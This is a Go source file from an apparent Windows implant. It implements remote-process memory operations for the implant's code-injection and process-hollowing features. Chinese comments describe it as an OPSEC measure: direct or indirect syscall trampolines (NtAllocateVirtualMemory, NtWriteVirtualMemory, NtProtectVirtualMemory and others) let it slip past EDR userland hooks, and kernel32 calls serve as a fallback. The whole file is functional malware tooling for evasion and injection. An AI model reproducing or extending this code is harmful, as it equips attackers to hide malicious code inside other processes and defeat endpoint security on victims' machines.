//go:build windows

package commands

// ===== 远端内存原语：NtXxx 优先，宿主 API 回退（OPSEC P0）=====
//
// 背景：`core/evasion/syscall.go` 早已备好 NtAllocateVirtualMemory /
// NtWriteVirtualMemory / NtProtectVirtualMemory / NtOpenProcess 的 direct/indirect
// trampoline，但注入链（inject_windows.go）与镂空（hollow_windows.go）此前仍直接
// 调 kernel32 —— 操作员即使选了 syscall 模式，也只有 NtCreateThreadEx 走了
// trampoline，真正最容易被 EDR 挂钩的三件套（分配 / 写入 / 改保护）还在 userland
// hook 之下。本文件把这两条链统一到同一层。
//
// 三条设计约束：
//  1. **每个原语独立回退**：trampoline 未准备、返回非 0、或 invoke 报错，都立刻改走
//     宿主 API。注入是"要么成功要么明确失败"的路径，规避手段不可用不能让它整条失效。
//  2. **两条路都做成可替换的函数字段**：否则"这一次到底走了哪条"只能实机看，
//     单测无从断言 —— 而这类接线写错恰恰没有任何运行期症状（功能全在，只是回到了
//     hook 下面），属于最难靠手工验证发现的一类缺陷。
//  3. **Trace() 记录真实调用序列**：回包/诊断带上它，事后能从日志判断路径。

import (
	"errors"
	"fmt"
	"implant/core/config"
	"implant/core/evasion"
	"syscall"
	"unsafe"
)

// 页保护与分配标志（winnt.h）。
const (
	pageReadOnly         = 0x02
	pageReadWrite        = 0x04
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40

	memCommit  = 0x1000
	memReserve = 0x2000

	// 节属性 IMAGE_SCN_MEM_*
	scnMemExecute = 0x20000000
	scnMemWrite   = 0x80000000
)

// remoteMemory 是注入/镂空需要的全部远端内存操作。
//
// 抽成接口的目的不是"以后换实现"，而是让 stagePayload / hardenImage /
// reserveImage 这些决定安全属性的步骤能用假实现做断言（见 remotemem_windows_test.go）。
type remoteMemory interface {
	OpenProcess(pid int, access uint32) (uintptr, error)
	Alloc(h uintptr, at, size uintptr, protect uint32) (uintptr, error)
	Write(h, dst uintptr, data []byte) (uintptr, error)
	Read(h, src uintptr, n int) ([]byte, error)
	Protect(h, addr, size uintptr, protect uint32) (uint32, error)
	Unmap(h, base uintptr) (uintptr, error)
	PEBAddress(h uintptr) (uintptr, error)
	Close(h uintptr)

	// Backend 返回当前生效的后端（"syscall:direct" / "host"），供回包说明。
	Backend() string
	// Trace 返回实际调用序列（含后端），供诊断。
	Trace() []string
}

// ntBackend 是 ntdll 侧的唯一出口（默认接 evasion.Syscall）。
type ntBackend struct {
	invoke func(name string, args ...uintptr) (uintptr, error)
	ready  func(name string) bool
}

func defaultNTBackend() ntBackend {
	return ntBackend{
		invoke: func(name string, args ...uintptr) (uintptr, error) { return evasion.Syscall(name, args...) },
		ready:  evasion.HasTrampoline,
	}
}

// hostBackend 是宿主 API 回退（kernel32 + ntdll 直接调用）。
type hostBackend struct {
	openProcess func(pid int, access uint32) (uintptr, error)
	alloc       func(h, at, size uintptr, protect uint32) (uintptr, error)
	write       func(h, dst uintptr, data []byte) (uintptr, error)
	read        func(h, src uintptr, n int) ([]byte, error)
	protect     func(h, addr, size uintptr, protect uint32) (uint32, error)
	unmap       func(h, base uintptr) (uintptr, error)
	peb         func(h uintptr) (uintptr, error)
	close       func(h uintptr)
}

// hybridMemory 按"先 syscall、失败回退宿主"的顺序执行每个原语。
type hybridMemory struct {
	mode  string // none/direct/indirect（决定 Backend() 的显示，也决定是否尝试 trampoline）
	useNt bool
	nt    ntBackend
	host  hostBackend
	trace []string
}

// newRemoteMemory 按编译期 syscall 模式构造（none 时全程宿主 API）。
func newRemoteMemory() *hybridMemory {
	mode := config.SyscallMode()
	return &hybridMemory{
		mode:  mode,
		useNt: mode != "none",
		nt:    defaultNTBackend(),
		host:  defaultHostBackend(),
	}
}

func (m *hybridMemory) record(format string, args ...any) {
	m.trace = append(m.trace, fmt.Sprintf(format, args...))
}

func (m *hybridMemory) Trace() []string { return m.trace }

func (m *hybridMemory) Backend() string {
	if m.useNt {
		return "syscall:" + m.mode
	}
	return "host"
}

// sysOK 尝试一次 trampoline 调用；只有"已准备 + 返回 STATUS_SUCCESS"才算成功。
func (m *hybridMemory) sysOK(name string, args ...uintptr) bool {
	if !m.useNt || m.nt.invoke == nil || m.nt.ready == nil || !m.nt.ready(name) {
		return false
	}
	status, err := m.nt.invoke(name, args...)
	return err == nil && status == 0
}

// ntReady 与 sysOK 的前置判断一致，供需要先做形态判断（如取回出参）的调用方使用。
func (m *hybridMemory) ntReady(name string) bool {
	return m.useNt && m.nt.invoke != nil && m.nt.ready != nil && m.nt.ready(name)
}

// ===== 原语实现 =====

func (m *hybridMemory) OpenProcess(pid int, access uint32) (uintptr, error) {
	if m.ntReady("NtOpenProcess") {
		var h uintptr
		// NtOpenProcess 要求 ObjectAttributes 非空：给一个只填 Length 的空结构，
		// ClientId 只带 UniqueProcess。传 NULL 会返回 STATUS_INVALID_PARAMETER，
		// 而那种失败会让我们"看起来试过 syscall"却永远走回退路径。
		oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}
		cid := clientID{UniqueProcess: uintptr(pid)}
		if m.sysOK("NtOpenProcess", uintptr(unsafe.Pointer(&h)), uintptr(access),
			uintptr(unsafe.Pointer(&oa)), uintptr(unsafe.Pointer(&cid))) && h != 0 {
			m.record("open(nt) pid=%d access=0x%x", pid, access)
			return h, nil
		}
	}
	h, err := m.host.openProcess(pid, access)
	if err != nil {
		return 0, err
	}
	m.record("open(host) pid=%d access=0x%x", pid, access)
	return h, nil
}

func (m *hybridMemory) Alloc(h uintptr, at, size uintptr, protect uint32) (uintptr, error) {
	if size == 0 {
		return 0, errors.New("分配长度不能为 0")
	}
	if m.ntReady("NtAllocateVirtualMemory") {
		base := at
		region := size
		if m.sysOK("NtAllocateVirtualMemory", h, uintptr(unsafe.Pointer(&base)), 0,
			uintptr(unsafe.Pointer(&region)), memCommit|memReserve, uintptr(protect)) && base != 0 {
			m.record("alloc(nt) at=0x%x base=0x%x size=0x%x prot=0x%x", at, base, size, protect)
			return base, nil
		}
	}
	addr, err := m.host.alloc(h, at, size, protect)
	if err != nil {
		return 0, err
	}
	m.record("alloc(host) at=0x%x base=0x%x size=0x%x prot=0x%x", at, addr, size, protect)
	return addr, nil
}

func (m *hybridMemory) Write(h, dst uintptr, data []byte) (uintptr, error) {
	if len(data) == 0 {
		return 0, nil
	}
	if m.ntReady("NtWriteVirtualMemory") {
		var written uintptr
		if m.sysOK("NtWriteVirtualMemory", h, dst, uintptr(unsafe.Pointer(&data[0])),
			uintptr(len(data)), uintptr(unsafe.Pointer(&written))) && written == uintptr(len(data)) {
			m.record("write(nt) dst=0x%x len=%d", dst, len(data))
			return written, nil
		}
	}
	n, err := m.host.write(h, dst, data)
	if err != nil {
		return n, err
	}
	m.record("write(host) dst=0x%x len=%d", dst, n)
	return n, nil
}

func (m *hybridMemory) Read(h, src uintptr, n int) ([]byte, error) {
	if n <= 0 {
		return nil, nil
	}
	buf := make([]byte, n)
	if m.ntReady("NtReadVirtualMemory") {
		var got uintptr
		if m.sysOK("NtReadVirtualMemory", h, src, uintptr(unsafe.Pointer(&buf[0])),
			uintptr(n), uintptr(unsafe.Pointer(&got))) && got == uintptr(n) {
			m.record("read(nt) src=0x%x len=%d", src, n)
			return buf, nil
		}
	}
	out, err := m.host.read(h, src, n)
	if err != nil {
		return nil, err
	}
	m.record("read(host) src=0x%x len=%d", src, n)
	return out, nil
}

func (m *hybridMemory) Protect(h, addr, size uintptr, protect uint32) (uint32, error) {
	if size == 0 {
		return 0, nil
	}
	if m.ntReady("NtProtectVirtualMemory") {
		base := addr
		region := size
		var old uint32
		if m.sysOK("NtProtectVirtualMemory", h, uintptr(unsafe.Pointer(&base)),
			uintptr(unsafe.Pointer(&region)), uintptr(protect), uintptr(unsafe.Pointer(&old))) {
			// 内核会把 base 向下取整到页、size 向上取整；把回传值记进 trace，
			// 便于事后核对实际被改了多大范围（比只记请求值更可信）。
			m.record("protect(nt) req=0x%x+0x%x actual=0x%x+0x%x prot=0x%x", addr, size, base, region, protect)
			return old, nil
		}
	}
	old, err := m.host.protect(h, addr, size, protect)
	if err != nil {
		return 0, err
	}
	m.record("protect(host) addr=0x%x size=0x%x prot=0x%x", addr, size, protect)
	return old, nil
}

func (m *hybridMemory) Unmap(h, base uintptr) (uintptr, error) {
	if m.ntReady("NtUnmapViewOfSection") && m.sysOK("NtUnmapViewOfSection", h, base) {
		m.record("unmap(nt) base=0x%x", base)
		return 0, nil
	}
	status, err := m.host.unmap(h, base)
	m.record("unmap(host) base=0x%x status=0x%x", base, status)
	return status, err
}

func (m *hybridMemory) PEBAddress(h uintptr) (uintptr, error) {
	if m.ntReady("NtQueryInformationProcess") {
		// PROCESS_BASIC_INFORMATION（x64）：PebBaseAddress 在 +0x8。
		var pbi [6]uintptr
		if m.sysOK("NtQueryInformationProcess", h, 0, uintptr(unsafe.Pointer(&pbi[0])),
			unsafe.Sizeof(pbi), 0) && pbi[1] != 0 {
			m.record("peb(nt) 0x%x", pbi[1])
			return pbi[1], nil
		}
	}
	peb, err := m.host.peb(h)
	if err != nil {
		return 0, err
	}
	m.record("peb(host) 0x%x", peb)
	return peb, nil
}

func (m *hybridMemory) Close(h uintptr) {
	if h == 0 || m.host.close == nil {
		return
	}
	m.host.close(h)
}

// ===== 宿主 API 回退（kernel32 + ntdll 直接调用）=====

var (
	memKernel32 = syscall.NewLazyDLL("kernel32.dll")
	memNtdll    = syscall.NewLazyDLL("ntdll.dll")

	memOpenProcess        = memKernel32.NewProc("OpenProcess")
	memVirtualAllocEx     = memKernel32.NewProc("VirtualAllocEx")
	memVirtualProtectEx   = memKernel32.NewProc("VirtualProtectEx")
	memWriteProcessMemory = memKernel32.NewProc("WriteProcessMemory")
	memReadProcessMemory  = memKernel32.NewProc("ReadProcessMemory")
	memCloseHandle        = memKernel32.NewProc("CloseHandle")
	memNtUnmapViewSection = memNtdll.NewProc("NtUnmapViewOfSection")
	memNtQueryInfoProcess = memNtdll.NewProc("NtQueryInformationProcess")
)

// OBJECT_ATTRIBUTES（x64，48 字节）。
type objectAttributes struct {
	Length                   uint32
	_                        uint32
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	_                        uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

// CLIENT_ID（16 字节）。
type clientID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

func defaultHostBackend() hostBackend {
	return hostBackend{
		openProcess: func(pid int, access uint32) (uintptr, error) {
			h, _, e := memOpenProcess.Call(uintptr(access), 0, uintptr(pid))
			if h == 0 {
				return 0, fmt.Errorf("OpenProcess 失败: %v", e)
			}
			return h, nil
		},
		alloc: func(h, at, size uintptr, protect uint32) (uintptr, error) {
			addr, _, e := memVirtualAllocEx.Call(h, at, size, memCommit|memReserve, uintptr(protect))
			if addr == 0 {
				return 0, fmt.Errorf("VirtualAllocEx 失败: %v", e)
			}
			return addr, nil
		},
		write: func(h, dst uintptr, data []byte) (uintptr, error) {
			var written uintptr
			r, _, e := memWriteProcessMemory.Call(h, dst, uintptr(unsafe.Pointer(&data[0])),
				uintptr(len(data)), uintptr(unsafe.Pointer(&written)))
			if r == 0 {
				return 0, fmt.Errorf("WriteProcessMemory 失败: %v", e)
			}
			return written, nil
		},
		read: func(h, src uintptr, n int) ([]byte, error) {
			buf := make([]byte, n)
			var got uintptr
			r, _, e := memReadProcessMemory.Call(h, src, uintptr(unsafe.Pointer(&buf[0])),
				uintptr(n), uintptr(unsafe.Pointer(&got)))
			if r == 0 {
				return nil, fmt.Errorf("ReadProcessMemory 失败: %v", e)
			}
			return buf[:got], nil
		},
		protect: func(h, addr, size uintptr, protect uint32) (uint32, error) {
			var old uint32
			r, _, e := memVirtualProtectEx.Call(h, addr, size, uintptr(protect), uintptr(unsafe.Pointer(&old)))
			if r == 0 {
				return 0, fmt.Errorf("VirtualProtectEx 失败: %v", e)
			}
			return old, nil
		},
		unmap: func(h, base uintptr) (uintptr, error) {
			status, _, _ := memNtUnmapViewSection.Call(h, base)
			if status != 0 {
				return status, fmt.Errorf("NtUnmapViewOfSection 失败 (status=0x%x)", status)
			}
			return 0, nil
		},
		peb: func(h uintptr) (uintptr, error) {
			var pbi [6]uintptr
			st, _, _ := memNtQueryInfoProcess.Call(h, 0, uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi), 0)
			if st != 0 || pbi[1] == 0 {
				return 0, fmt.Errorf("读取 PEB 失败 (status=0x%x)", st)
			}
			return pbi[1], nil
		},
		close: func(h uintptr) { memCloseHandle.Call(h) },
	}
}
